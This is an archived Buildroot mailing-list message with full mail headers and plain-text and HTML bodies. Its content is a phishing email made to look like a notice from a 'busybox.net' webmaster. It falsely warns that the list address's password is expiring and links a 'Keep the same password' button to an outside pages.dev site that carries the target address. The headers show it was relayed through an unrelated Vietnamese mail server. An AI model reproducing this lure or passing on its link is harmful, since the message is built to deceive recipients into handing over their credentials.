Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 48F1DC5B543
	for <buildroot@archiver.kernel.org>; Fri,  6 Jun 2025 00:07:47 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 0BEF5615B6;
	Fri,  6 Jun 2025 00:07:47 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id PdPI9nC3UW6n; Fri,  6 Jun 2025 00:07:46 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2E848615A3
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id 2E848615A3;
	Fri,  6 Jun 2025 00:07:46 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id 6E62CC8
 for <buildroot@buildroot.org>; Fri,  6 Jun 2025 00:07:44 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id 54CCE80EF7
 for <buildroot@buildroot.org>; Fri,  6 Jun 2025 00:07:44 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id yMYre6RgplWJ for <buildroot@buildroot.org>;
 Fri,  6 Jun 2025 00:07:43 +0000 (UTC)
Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=103.124.95.4;
 helo=mail.futureinnovation.vn; envelope-from=ngoilv@futureinnovation.vn;
 receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 85B7480EB5
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 85B7480EB5
Received: from mail.futureinnovation.vn (mail.futureinnovation.vn
 [103.124.95.4])
 by smtp1.osuosl.org (Postfix) with ESMTPS id 85B7480EB5
 for <buildroot@busybox.net>; Fri,  6 Jun 2025 00:07:43 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by mail.futureinnovation.vn (Postfix) with ESMTP id D21DA3A84606
 for <buildroot@busybox.net>; Fri,  6 Jun 2025 05:23:30 +0700 (+07)
Received: from mail.futureinnovation.vn ([127.0.0.1])
 by localhost (mail.futureinnovation.vn [127.0.0.1]) (amavis, port 10032)
 with ESMTP id BXBTt02xvoUo for <buildroot@busybox.net>;
 Fri,  6 Jun 2025 05:23:30 +0700 (+07)
Received: from localhost (localhost [127.0.0.1])
 by mail.futureinnovation.vn (Postfix) with ESMTP id 5E1A43A84628
 for <buildroot@busybox.net>; Fri,  6 Jun 2025 05:23:29 +0700 (+07)
X-Virus-Scanned: amavis at futureinnovation.vn
Received: from mail.futureinnovation.vn ([127.0.0.1])
 by localhost (mail.futureinnovation.vn [127.0.0.1]) (amavis, port 10026)
 with ESMTP id 0SmeU1UCv7mH for <buildroot@busybox.net>;
 Fri,  6 Jun 2025 05:23:29 +0700 (+07)
Received: from ip206.ip-135-125-250.eu (ip206.ip-135-125-250.eu
 [135.125.250.206])
 by mail.futureinnovation.vn (Postfix) with ESMTPSA id 0E1013A8460D
 for <buildroot@busybox.net>; Fri,  6 Jun 2025 05:23:26 +0700 (+07)
From: busybox.net <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 5 Jun 2025 15:29:05 -0700
Message-ID: <20250605152904.26742280DAF1BB08@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] FW: REVIEW WEB-PROJECT 0-00921.
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2868589032453338875=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>


--===============2868589032453338875==
Content-Type: multipart/alternative;
	boundary="----=_NextPart_000_0012_21D72137.6AA58340"


------=_NextPart_000_0012_21D72137.6AA58340
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Password Credentials=C2=A0

Your password expires now,=C2=A0and=C2=A0buildroot@busybox.net=C2=A0will be=
=20
closed automatically. Click below to continue with the same=20
buildroot@busybox.net=C2=A0password.=C2=A0 =C2=A0=C2=A0
Keep the same password=20
(=C2=A0https://uierfjuhh.pages.dev/?DTnFmy=3Dbuildroot@busybox.net(**)G3nMi=
G=C2=A0)


=C2=A0Webmaster for=C2=A0busybox.net
=C2=A9 2025
------=_NextPart_000_0012_21D72137.6AA58340
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
w3.org/TR/html4/loose.dtd">

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.5em;">
<div align=3D"center" style=3D"padding: 40px 20px 36px; border-radius: 8px;=
 border: thin solid rgb(218, 220, 224); border-image: none; color: rgb(34, =
34, 34); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
nt-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: sm=
all; font-style: normal; font-weight: 400; word-spacing: 0px; white-space: =
normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
ariant-ligatures: normal; font-variant-caps: normal;=20
-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
coration-style: initial; text-decoration-color: initial;">
<div style=3D'line-height: 32px; padding-top: 0px; padding-bottom: 24px; fo=
nt-family: "Google Sans", Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; border-bottom-color: rgb(218, 220, 224); border-top-width: 0px; border-bo=
ttom-width: thin; border-bottom-style: solid;'>
<div style=3D"padding-top: 0px; font-size: 24px; border-top-width: 0px;"><f=
ont color=3D"#ff0000">Password Credentials</font>&nbsp;</div></div>
<div style=3D"line-height: 20px; padding-top: 20px; font-family: Roboto-Reg=
ular, Helvetica, Arial, sans-serif;"><span style=3D"font-family: Roboto, Ro=
botoDraft, Helvetica, Arial, sans-serif;"><font size=3D"4">Your password ex=
pires now,&nbsp;and<span>&nbsp;<font color=3D"#394fc6">buildroot@busybox.ne=
t</font></span><span>&nbsp;</span>will be closed automatically. Click below=
 to continue with the same <span>buildroot@busybox.net</span><span>&nbsp;</=
span>password.</font></span><span>&nbsp;</span>
 &nbsp;<span style=3D'color: rgb(38, 42, 51); font-family: -apple-system, B=
linkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Hel=
vetica Neue", sans-serif; font-size: 14px;'>&nbsp;</span></div>
<div style=3D"line-height: 20px; padding-top: 20px;">
<div style=3D"padding-top: 32px; font-family: Roboto-Regular, Helvetica, Ar=
ial, sans-serif; font-size: 14px; border-top-width: 0px;">
<a style=3D'padding: 10px 24px; border-radius: 5px; color: rgb(255, 255, 25=
5); line-height: 16px; font-family: "Google Sans", Roboto, RobotoDraft, Hel=
vetica, Arial, sans-serif; display: inline-block; min-width: 90px; backgrou=
nd-color: rgb(65, 132, 243);' href=3D"https://uierfjuhh.pages.dev/?DTnFmy=
=3Dbuildroot@busybox.net(**)G3nMiG" rel=3D"noreferrer">Keep the same passwo=
rd</a></div></div></div>
<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
x; letter-spacing: normal; font-family: Roboto, RobotoDraft, Helvetica, Ari=
al, sans-serif; font-size: small; font-style: normal; font-weight: 400; wor=
d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; background-colo=
r: rgb(255, 255, 255); font-variant-ligatures: normal; font-variant-caps: n=
ormal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; =
text-decoration-style: initial;=20
text-decoration-color: initial;">
<div style=3D"text-align: center; line-height: 18px; padding-top: 12px; fon=
t-family: Roboto-Regular, Helvetica, Arial, sans-serif; font-size: 11px; bo=
rder-top-width: 0px;">
<div style=3D"padding-top: 0px; border-top-width: 0px;">&nbsp;<b><font colo=
r=3D"#ff0000">Webmaster for<span>&nbsp;busybox.net</span></font></b></div>
<div style=3D"direction: ltr;"><b><font color=3D"#ff0000">&copy; 2025</font=
></b></div></div></div></body></html>
------=_NextPart_000_0012_21D72137.6AA58340--

--===============2868589032453338875==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============2868589032453338875==--
